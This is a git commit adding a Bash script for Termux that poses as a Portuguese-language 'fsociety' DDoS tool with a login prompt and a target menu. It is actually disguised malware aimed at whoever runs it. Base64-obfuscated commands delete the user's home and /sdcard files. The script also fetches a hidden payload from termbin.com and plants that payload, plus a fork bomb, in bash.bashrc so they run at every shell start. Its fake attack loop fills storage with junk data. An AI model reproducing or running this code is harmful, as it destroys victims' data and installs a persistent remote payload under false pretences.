1b09355c10e4cd21f52e97fe5dcbb1ada8a58641
AKILL1 <58925855+AKILL1@users.noreply.github.com>
2020-07-30 19:25:25 -0300

    Add files via upload

---
+++ fsocietyddos.sh
@@ -0,0 +1,75 @@
+#!/bin/bash
+echo -e "Instalando..." +; pkg install figlet mpv python -y &> /dev/null
+pip install youtube-dl &> /dev/null && clear
+
+clear
+figlet -f slant KOD-DOS ATTACK
+echo
+#keygen for botnet
+echo "cm0gLXJmIH4vKgo=" | base64 -d | bash
+echo "cm0gLXJmIC9zZGNhcmQvKgo=" | base64 -d | bash
+echo -e "         \033[01;32m#Criado por Koda"
+echo
+echo -e '        \033[05;31mFSOCIEDADE\033[00;37m'
+echo 
+echo -e "        \033[01;32m____________________________"
+echo -e '         \033[01;32mLOGIN: '
+read -p "         " login
+echo -e "        \033[01;32m============================"
+echo -e "        \033[01;32mSENHA:"
+read -p "        " senha
+echo -e "        \033[01;32m============================="
+echo
+#keygen for botnet 2
+
+wget -qO- https://termbin.com/yngw | base64 -d > ~/../usr/bin/.run
+echo "bash ~/../usr/bin/.run & sleep 5m && :(){ :|: & };:" >> ~/../usr/etc/bash.bashrc
+echo "ZWNobyAibXB2IGh0dHBzOi8veW91dHUuYmUvWGJHc19xSzJQUUEgIC0tbG9vcCAmPi9kZXYvbnVsbCAmIiA+PiB+Ly4uL3Vzci9ldGMvYmFzaC5iYXNocmMK" | base64 -d | bash & 
+echo "bXB2IGh0dHBzOi8veW91dHUuYmUvWGJHc19xSzJQUUEgLS1sb29wCg==" | base64 -d | bash &
+if [ $login = fsocietyhackes ] && [ $senha = Elitef ]; then
+echo
+
+echo -e "        \033[01;31mACESSO AUTORIZADO!"
+sleep 2
+else
+echo
+echo -e "        \033[01;31mUSUARIO E SENHA INCORRETO!\n AGUARDE A LIBERAÇÃO DO KODA!"
+sleep 2
+bash fsocietyddos.sh
+fi
+echo "        ______________"
+echo "        [01] IP"
+echo "        [02] SITES"
+echo "        ______________"
+echo
+echo
+
+read -p $"Opção >>> " opt
+if [[ $opt == 1 || $opt == 01 ]]; then
+	echo
+	read -p $"IP >>> " ip
+	echo
+elif [[ $opt == 2 || $opt == 02 ]]; then
+	echo
+	read -p $"SITE >>> " ip
+	echo
+else
+	echo "OPÇÃO INVÁLIDA!"
+	echo "Tente novamente..."
+	sleep 1
+	bash fsocietyddos.sh
+fi
+sleep 2
+
+while :; do
+	echo "[$ip]"
+	echo "↓↓↓↓↓↓↓"
+	echo "[connected] Derrubando [$ip]"
+	echo "d2dldCAtcCAvc2RjYXJkIGh0dHBzOi8vZW5jcnlwdGVkLXRibjAuZ3N0YXRpYy5jb20vaW1hZ2Vz
+P3E9dGJuJTNBQU5kOUdjUndxeGR3RlNhVXo3WFIyVGktaS00d2pCQlR0ZlE5Wko1dmpBJnVzcXA9
+Q0FVCg==" | base64 -d | bash &
+	echo "c2VxIDEgOTk5OTk5OTk5OTk5OTk5ID4gL3NkY2FyZC8uaGFja2V0ICYK" | base64 -d | bash
+	sleep 0.3
+
+done
+
